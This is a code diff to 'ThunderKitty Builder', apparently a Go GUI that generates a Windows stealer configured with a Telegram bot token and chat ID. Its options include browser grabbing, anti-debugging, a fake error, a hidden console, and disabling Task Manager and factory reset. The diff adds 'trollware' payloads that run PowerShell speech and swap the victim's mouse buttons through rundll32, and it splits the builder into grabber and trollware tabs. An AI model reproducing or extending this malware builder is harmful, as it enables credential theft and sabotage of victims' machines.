@@ -13,7 +13,7 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL string) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse bool) {
 	content := fmt.Sprintf(`
 package main
 
@@ -78,8 +78,22 @@ func main() {
 	} else {
 		fmt.Println("Open website not enabled")
 	}
+	
+	ttsMessage := "%s"
+	if ttsMessage != "" {
+		exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
+	} else {
+		fmt.Println("TTS not enabled")
+	}
+
+	if %t {
+		exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
+	} else {
+		fmt.Println("Swap mouse not enabled")
+	}
+ 
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -114,11 +128,13 @@ func main() {
 	a := app.New()
 	w := a.NewWindow("ThunderKitty Builder")
 
-	telebottokenEntry := widget.NewEntry()
-	telebottokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
+	// Creating all the widgets
+	// Grabber Widgets
+	telegramBotTokenEntry := widget.NewEntry()
+	telegramBotTokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
 
-	telechatidEntry := widget.NewEntry()
-	telechatidEntry.SetPlaceHolder("Enter Telegram Chat ID")
+	telegramChatIdEntry := widget.NewEntry()
+	telegramChatIdEntry.SetPlaceHolder("Enter Telegram Chat ID")
 
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
 	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
@@ -127,31 +143,50 @@ func main() {
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
 
+	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
-	openSiteEntry.SetPlaceHolder("Open website (leave blank for none)")
+	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
+
+	speakTTSEntry := widget.NewEntry()
+	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
+
+	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
 
 	buildButton := widget.NewButton("Build", func() {
-		telebottoken := telebottokenEntry.Text
-		telechatid := telechatidEntry.Text
+		telebottoken := telegramBotTokenEntry.Text
+		telechatid := telegramChatIdEntry.Text
 		openSiteURL := openSiteEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL)
+		speakTTSMessage := speakTTSEntry.Text
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked)
 	})
 
-	form := container.NewVBox(
+	grabberSettings := container.NewVBox(
 		widget.NewLabel("ThunderKitty Configuration"),
-		telebottokenEntry,
-		telechatidEntry,
+		telegramBotTokenEntry,
+		telegramChatIdEntry,
 		enableAntiDebug,
 		enableFakeError,
 		enableBrowsers,
 		hideConsole,
 		disableFactoryReset,
 		disableTaskManager,
-		openSiteEntry,
 		buildButton,
 	)
 
-	w.SetContent(form)
+	// Trollware Configuration
+	trollwareSettings := container.NewVBox(
+		widget.NewLabel("Trollware Configuration"),
+		openSiteEntry,
+		speakTTSEntry,
+		enableSwapMouse,
+	)
+
+	tabs := container.NewAppTabs(
+		container.NewTabItem("Grabber Configuration", grabberSettings),
+		container.NewTabItem("Trollware Configuration", trollwareSettings),
+	)
+
+	w.SetContent(tabs)
 	w.Resize(fyne.NewSize(400, 350))
 	w.ShowAndRun()
 }
